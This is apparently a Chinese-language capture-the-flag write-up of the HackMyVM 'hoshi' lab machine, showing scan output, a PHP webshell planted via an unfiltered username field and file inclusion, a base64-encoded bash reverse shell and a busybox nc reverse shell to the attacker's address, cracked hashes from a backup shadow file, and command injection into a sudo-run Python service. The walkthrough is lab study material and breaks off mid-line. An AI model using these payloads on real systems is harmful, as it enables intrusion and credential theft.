STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: \xE5\x95\x86\xE5\x93\x81\xE5\x8F\x8D\xE9\xA6\x88 - \xE6\x98\x9F\xE9\x99\x85\xE5\x95\x86\xE5\x9F\x8E<br>MAC Address: 08:00:27:93:25:4C (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 33.089 days (since Wed May 21 01:05:12 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=261 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.80 ms 192.168.56.121<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br><br></code></pre></td></tr></table></figure><p>dirsearchï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.121<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/reports/_192.168.56.121/_25-06-23_03-14-16.txt<br><br>Target: http://192.168.56.121/<br><br>[03:14:16] Starting:                                                                                                                                       <br>[03:14:17] 403 -  279B  - /.ht_wsr.txt                                      <br>[03:14:17] 403 -  279B  - /.htaccess.bak1                                   <br>[03:14:17] 403 -  279B  - /.htaccess.orig                                   <br>[03:14:17] 403 -  279B  - /.htaccess.sample<br>[03:14:17] 403 -  279B  - /.htaccess.save                                   <br>[03:14:17] 403 -  279B  - /.htaccess_extra<br>[03:14:17] 403 -  279B  - /.htaccess_orig                                   <br>[03:14:17] 403 -  279B  - /.htaccess_sc<br>[03:14:17] 403 -  279B  - /.htaccessBAK<br>[03:14:17] 403 -  279B  - /.htaccessOLD<br>[03:14:17] 403 -  279B  - /.htaccessOLD2<br>[03:14:17] 403 -  279B  - /.htm                                             <br>[03:14:17] 403 -  279B  - /.html                                            <br>[03:14:17] 403 -  279B  - /.htpasswd_test                                   <br>[03:14:17] 403 -  279B  - /.httr-oauth<br>[03:14:17] 403 -  279B  - /.htpasswds<br>[03:14:17] 403 -  279B  - /.php                                             <br>[03:14:19] 200 -    1KB - /admin.php                                                                         <br>[03:14:28] 200 -   23KB - /info.php                                         <br>[03:14:34] 200 -  109B  - /robots.txt                                       <br>[03:14:34] 403 -  279B  - /server-status                                    <br>[03:14:34] 403 -  279B  - /server-status/                                   <br>[03:14:37] 200 -  562B  - /uploads/                                         <br>[03:14:37] 301 -  318B  - /uploads  -&gt;  http://192.168.56.121/uploads/      <br>                                                                             <br>Task Completed                                                           <br></code></pre></td></tr></table></figure><p>gobusterï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"> gobuster dir  -u http://192.168.56.121 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.121<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,zip<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 279]<br>/index.php            (Status: 200) [Size: 9185]<br>/.php                 (Status: 403) [Size: 279]<br>/info.php             (Status: 200) [Size: 85756]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.121/uploads/]<br>/admin.php            (Status: 200) [Size: 2726]<br>/robots.txt           (Status: 200) [Size: 86]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102795 / 1102800 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>å‰æœŸçš„ä¿¡æ¯æ”¶é›†å¤§å·®ä¸å·®ï¼Œè®¿é—®webé¡µé¢ã€‚</p><p>åšçš„æ—¶å€™ç¾¤é‡Œå·²ç»ç»™å‡ºäº†ä¸¤ä¸ªæç¤ºï¼šåŒå›¾ç›²æ°´å°ï¼Œadmin.phpçš„ç™»å½•å¯†ç å°±åœ¨ç½‘é¡µä¸Šæ— éœ€çˆ†ç ´ã€‚</p><p>å…ˆè®¿é—®robotsï¼Œå¾—åˆ°è¯¥ç½‘ç«™çš„logoå’Œmazesecçš„logoæœ‰å…³è”ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_5BE3u5kmq1.png"></p><p>ç”¨wgetä¸‹è½½è¿™é‡Œçš„logoå’Œmazesecçš„logoï¼Œä½¿ç”¨bç¥çš„puzzlesolverä¸€æŠŠæ¢­ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png"></p><p><img src="/2025/06/23/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png"></p><p>å¾—åˆ°ä¸€ä¸ªå­ç›®å½•hoshi&#x2F;ã€‚</p><style>.swmrogbavofy{zoom: 50%;}</style><img src="/2025/06/23/HackMyVM-hoshi/Photos_TQPw6GhFt9.png" class="swmrogbavofy"><p>è®¿é—®hoshi&#x2F;ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªgift.phpï¼Œè®¿é—®æç¤ºéæ³•æ–‡ä»¶åï¼ŒçŒœæƒ³å¯èƒ½æœ‰æ–‡ä»¶åŒ…å«ï¼Œä¸è¿‡æš‚æ—¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>å›åˆ°ç½‘ç«™é¦–é¡µï¼Œåº•ä¸‹æœ‰ä¸ªç”¨æˆ·åé¦ˆåŠŸèƒ½ï¼Œç»“åˆä¸Šé¢çš„å®¢æœå›¢é˜Ÿä¸‰æ—¥å†…è§£å†³æˆ‘ä»¥ä¸ºæ˜¯æœ‰xssï¼Œä½†æ˜¯è¯•äº†åŠå¤©æ²¡ç”¨ï¼Œåæ¥æ‰¾ä½œè€…è¦æç¤ºæ‰çŸ¥é“æ²¡å…³ç³»ï¼Œå°±æ˜¯æ™®é€šçš„å¯†ç ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_hSwbcCRkxD.png"></p><p>ä¹‹åæ²¡è¾™äº†è¯•äº†è¯•ç”µè¯å·ç ï¼Œå°±æ˜¯è¿™ä¸ªï¼Œè¿›å…¥ç®¡ç†å‘˜ç•Œé¢ã€‚</p><p>è¿›å…¥ä¹‹åå‘ç°æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç›®å½•ï¼Œç»“åˆä½œè€…çš„æç¤ºï¼Œxssæ²¡ç”¨ï¼Œé‚£å¯èƒ½æ˜¯ç›´æ¥å†™é©¬è¿›å»ï¼Œè¯•äº†å‡ æ¬¡å‘ç°å…¨ç»™è¿‡æ»¤äº†ï¼Œå› ä¸ºå®ƒä¼šæŠŠphpçš„å°äºå·å’Œå¤§äºå·è½¬å†™æˆ&amp;It;å’Œ&amp;gt;ï¼Œå³htmlç¼–ç ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png"></p><p>ä¸è¿‡å‘ç°äº†ç”¨æˆ·åä¸ä¼šè¢«è½¬å†™ï¼Œé©¬ä¸Šå°è¯•åœ¨ç”¨æˆ·åä¸­æ’å…¥phpä»£ç ã€‚</p><p>ä½†æŠŠæ¶æ„æ„é€ çš„payloadä¸Šä¼ ååœ¨åå°æŸ¥çœ‹ï¼Œå‘ç°ä»£ç æ²¡æœ‰è¢«æ‰§è¡Œï¼Œè€Œä¸”æˆ‘ä»¬çš„ç”¨æˆ·åä¹Ÿä¸è§äº†ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿè¢«è¿‡æ»¤äº†å‘¢ï¼Œå’Œä¹‹å‰çš„å¯èƒ½ä¸æ˜¯ä¸€ç§é€»è¾‘ã€‚ï¼ˆè¿™é‡Œåˆç¡¬æ§æˆ‘å¤§åŠä¸ªå°æ—¶ï¼‰</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_JDxrQxRWLD.png"></p><p>åœ¨ä¸€é€šä¸œç¿»è¥¿æ‰¾åŒ…æ‹¬ä½†ä¸é™äºçœ‹å®Œäº†info.phpä¹‹åï¼Œç»ˆäºæƒ³èµ·æ¥è¦çœ‹æºç äº†ï¼Œè™½ç„¶phpé¡µé¢æœ¬èº«ä¸å¯è§ï¼Œä½†è‡³å°‘å¯ä»¥çœ‹ä¸€çœ‹å…ƒç´ ï¼Œå…¶ä¸­æœ‰ä¸€å¥è¯è¯´é™æ€ç•Œé¢å·²ç”Ÿæˆã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_5bddHb0PPo.png"></p><p>è¿™å°±èƒ½è§£é‡Šæˆ‘ä»¬åˆšåˆšçš„ç–‘é—®äº†ï¼Œæˆ‘ä»¬ç°åœ¨çœ‹åˆ°çš„admin.phpæ ¹æœ¬ä¸æ˜¯çœŸçš„phpæ–‡ä»¶ï¼Œè€Œæ˜¯åˆšåˆšé‚£ä¸ªç™»å½•ç•Œé¢è·³è½¬è¿‡æ¥çš„ä¸çŸ¥é“å«ä»€ä¹ˆçš„htmæˆ–è€…htmlæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„ä»£ç æ— æ³•æ‰§è¡Œã€‚</p><p>dirsearchå†æ‰«ä¸€éï¼Œè¿™æ—¶å‘ç°äº†ä¸€ä¸ªadmin.htmlï¼Œè®¿é—®å’Œadmin.phpä¸€æ¨¡ä¸€æ ·ï¼Œå°±å¥½åƒhexoçš„åšå®¢ä¸€æ ·ç”¨æ¡†æ¶ç”Ÿæˆé™æ€çš„ç•Œé¢ã€‚</p><p>å¾ˆæ˜¾ç„¶è¿™å°±æ˜¯çœŸæ­£ä»£ç åµŒå…¥çš„åœ°æ–¹ï¼Œé‚£ç°åœ¨å°±å·®å¦‚ä½•æ‰§è¡Œäº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[03:14:19] 200 -    2KB - /admin.html <br></code></pre></td></tr></table></figure><p>è¿˜è®°å¾—ä¹‹å‰çš„gift.phpå—ï¼Œç°åœ¨æˆ‘ä»¬æ¥fuzzä¸€ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.56.121/hoshi/gift.php?FUZZ=index.html<br>Total requests: 207643<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br><br>000000741:   200        0 L      2 W        30 Ch       &quot;file&quot;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å‚æ•°fileã€‚</p><p>åˆ©ç”¨é“¾å¾ˆæ¸…æ™°äº†ï¼šç”¨gift.phpåŒ…å«admin.htmlï¼Œæ‰§è¡Œé‡Œé¢çš„phpä»£ç å®ç°rceã€‚</p><p>ä½†æ˜¯ä¸Šä¼ å®Œæ¶æ„payloadï¼Œç„¶åä¸ç»è¿‡admin.phpçš„ä¸­ç»§ç›´æ¥å»è®¿é—®æˆ–è€…åŒ…å«admin.htmlï¼Œä¼šå‘ç°é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p><p>å› ä¸ºæ­¤æ—¶çš„htmlæ–‡ä»¶è¿˜æ²¡æœ‰è¢«admin.phpè§£æè¿›å»ï¼Œæ‰€ä»¥è¿™é‡Œçš„ä»£ç å®é™…ä¸Šæ˜¯è¢«æ­£ç»Ÿhtmlå¤„ç†æ–¹å¼æ³¨é‡Šæ‰äº†ï¼Œå¿…é¡»æå‰åŠ è½½admin.phpæ‰è¡Œã€‚ï¼ˆæ„Ÿè°¢sublargeå¤§ä½¬æŒ‡æ­£ï¼‰</p><p>æˆ‘ä»¬å…ˆç”¨phpinfoæµ‹è¯•ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_V4E0u3mEwH.png"></p><p>ä¸å‡ºæ‰€æ–™çš„è¢«æˆåŠŸæ‰§è¡Œäº†ã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_oiEEbjwEl8.png"></p><p>ä¹‹åæˆ‘ä»¬å†ä¼ ä¸€å¥è¯æœ¨é©¬å°è¯•æ‰§è¡Œå‘½ä»¤ã€‚ï¼ˆè¿™é‡Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆsystemä¸èƒ½ç”¨äº†ï¼Œæ¢äº†shellexecæ‰æˆåŠŸï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]); <span class="hljs-meta">?&gt;</span> <br>http:<span class="hljs-comment">//192.168.56.121/hoshi/gift.php?file=admin.html</span><br>a=whoami<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸã€‚</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_6MnLSaXONg.png"></p><p>ä¹‹ååå¼¹shellå³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=<span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_X1b3zx9rDv.png"></p><h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr><p>userææƒæ¯”æ‹¿åˆ°webshellè¦ç®€å•å¾ˆå¤šï¼Œå…ˆçœ‹homeä¸­çš„ç”¨æˆ·æ˜¯welcomeï¼Œå¾—åˆ°ææƒç›®æ ‡ï¼Œä¸‹ä¸€æ­¥ä»ç„¶æ˜¯è€æ–¹æ³•grepç®€å•ç²—æš´çš„éå†ï¼Œä¸è¿‡æ²¡æˆã€‚</p><p>å¥½åœ¨ä½œè€…è—çš„ä¸ç®—ç‰¹åˆ«éšè”½ï¼Œåˆ°å¤„ä¹±ç¿»æ‰¾åˆ°ä¸€ä¸ªshadowæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯è¦çˆ†ç ´äº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@hoshi:/var$ ls<br>backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www<br>www-data@hoshi:/var$ cd backups/<br>www-data@hoshi:/var/backups$ ls<br>apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  apt.extended_states.3.gz  apt.extended_states.4.gz  shadow~<br>www-data@hoshi:/var/backups$ cat shadow~ <br>root:$6$TfSlMzl8/eUh9mY0$wVygBx94VuTMRZq016O3IPG2mn1e.MFz2WKK.pACuy/Sa1dTHqu0vWtbTBrt/Q8dIWGBeYrY90ERemhYElKHv1:20190:0:99999:7:::<br>daemon:*:20166:0:99999:7:::<br>bin:*:20166:0:99999:7:::<br>sys:*:20166:0:99999:7:::<br>sync:*:20166:0:99999:7:::<br>games:*:20166:0:99999:7:::<br>man:*:20166:0:99999:7:::<br>lp:*:20166:0:99999:7:::<br>mail:*:20166:0:99999:7:::<br>news:*:20166:0:99999:7:::<br>uucp:*:20166:0:99999:7:::<br>proxy:*:20166:0:99999:7:::<br>www-data:*:20166:0:99999:7:::<br>backup:*:20166:0:99999:7:::<br>list:*:20166:0:99999:7:::<br>irc:*:20166:0:99999:7:::<br>gnats:*:20166:0:99999:7:::<br>nobody:*:20166:0:99999:7:::<br>_apt:*:20166:0:99999:7:::<br>systemd-timesync:*:20166:0:99999:7:::<br>systemd-network:*:20166:0:99999:7:::<br>systemd-resolve:*:20166:0:99999:7:::<br>systemd-coredump:!!:20166::::::<br>messagebus:*:20166:0:99999:7:::<br>sshd:*:20166:0:99999:7:::<br>welcome:$6$geD2QaGnx/AiHPAb$8ihVmhNA1GIUFbAkCuUp.KzsUuzAztIlrYNbPFoyORE9U9dsf/L13AuCNpqkJSxu0HG4ltlhJFJKU2Y1Gj8Sg.:20259:0:99999:7:::<br><br></code></pre></td></tr></table></figure><p>johnçˆ†ç ´å¾—åˆ°å¯†ç loveme2ã€‚</p><p>sshç™»ä¸Šå»æ‹¿åˆ°userã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh welcome@192.168.56.121<br>welcome@192.168.56.121&#x27;s password: <br>Linux hoshi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Mon Jun 23 02:29:41 2025 from 192.168.56.104<br>welcome@hoshi:~$ cat user.txt <br>flag&#123;user-73b671a5f913d849d405784a428288dd&#125;<br>welcome@hoshi:~$ <br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>sudo -l æŸ¥çœ‹å¯æ‰§è¡Œç¨‹åºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">welcome@hoshi:~$ sudo -l<br>Matching Defaults entries for welcome on hoshi:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User welcome may run the following commands on hoshi:<br>    (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py<br>welcome@hoshi:~$ <br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">welcome@hoshi:~$ sudo /usr/bin/python3 /root/12345.py<br>Server listening on port 12345...<br></code></pre></td></tr></table></figure><p>å‘ç°å¼€å¯äº†ä¸€ä¸ªç«¯å£ï¼Œæˆ‘ä»¬ç”¨ncè¿ä¸€ä¸‹ï¼Œæ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œç•Œé¢ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 192.168.56.121 12345      <br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">x</span><br>Unknown command. Type &#x27;help&#x27; for commands.<br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash"><span class="hljs-built_in">help</span></span><br>=== Configuration Shell ===<br>?/help          List available commands<br>q/quit          Exit the shell<br>read_config     Read server configuration<br>write_config    Write to server configuration<br>list_files      List files in /opt directory<br>check_status    Check server status<br>exec_cmd        Execute allowed system commands (e.g., whoami, pwd)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash"></span><br><span class="language-bash"></span><br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯åªèƒ½æ‰§è¡Œç™½åå•ä¸­çš„å‘½ä»¤ï¼Œä¸è¿‡æœ‰ä¸ªlist_filesï¼Œåˆ—å‡º&#x2F;optç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">list_files</span><br>Files in /opt:<br>server.conf<br>server.log<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹ä¸Šè¿°ç›®å½•ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œserver.confæ˜¯ç©ºæ–‡ä»¶ï¼Œä½†server.logæ¯”è¾ƒæœ‰æ„æ€ã€‚</p><p>æˆ‘ä»¬ç”¨é¶æœºç»™çš„å‘½ä»¤æ‰§è¡Œå·¥å…·æ‰§è¡Œç™½åå•ä¸­çš„pwdã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span></span><br>/home/welcome<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[2025-06-23 06:57:22] (&#x27;192.168.56.104&#x27;, 35486): Received: list_files<br>[2025-06-23 06:58:54] (&#x27;192.168.56.104&#x27;, 35486): Received: exec_cmd pwd<br>[2025-06-23 06:58:54] (&#x27;192.168.56.104&#x27;, 35486): Executing command: sh -c &#x27;pwd&#x27;<br></code></pre></td></tr></table></figure><p>å‘ç°äº†è¿™ä¸ªlogæ–‡ä»¶ä¼šè®°å½•æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„å‘½ä»¤ï¼ŒåŒæ—¶éå¸¸å…³é”®çš„ä¸€ç‚¹æ˜¯å®ƒçš„å‘½ä»¤éƒ½æ˜¯ç”¨sh-cæ¥æ‰§è¡Œçš„ï¼Œå³å¯ä»¥ç”¨åˆ†å·æˆ–è€…&amp;&amp;æ¥å‘½ä»¤æ³¨å…¥ã€‚</p><p>å°è¯•æ„é€ æ³¨å…¥ï¼Œä¸è¿‡è¿™è¾¹å¥½åƒæ˜¯è¿‡æ»¤äº†ä¸€äº›ç¬¦å·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; ; ls &#x27;</span></span><br>Error: Forbidden characters (;|&amp;&lt;&gt;) detected.<br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; &amp;&amp; ls&#x27;</span></span><br>/home/welcome<br>user.txt<br></code></pre></td></tr></table></figure><p>æˆåŠŸå®ç°ã€‚</p><p>é‚£æ¥ä¸‹æ¥ç”¨busyboxåå¼¹shellå°±å¯ä»¥äº†ï¼ˆç¾¤å‹çš„é¶æœºä¸€èˆ¬éƒ½ä¼šè‡ªå¸¦busyboxï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; &amp;&amp; busybox nc 192.168.56.104 4444 -e /bin/bash&#x27;</span></span><br><br>[+] Listening for reverse shells on 0.0.0.0:4444 â†’  127.0.0.1 â€¢ 192.168.21.128 â€¢ 192.168.56.104 â€¢ 172.18.0.1 â€¢ 172.17.0.1<br>â¤  ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got reverse shell from hoshi-192.168.56.121-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to 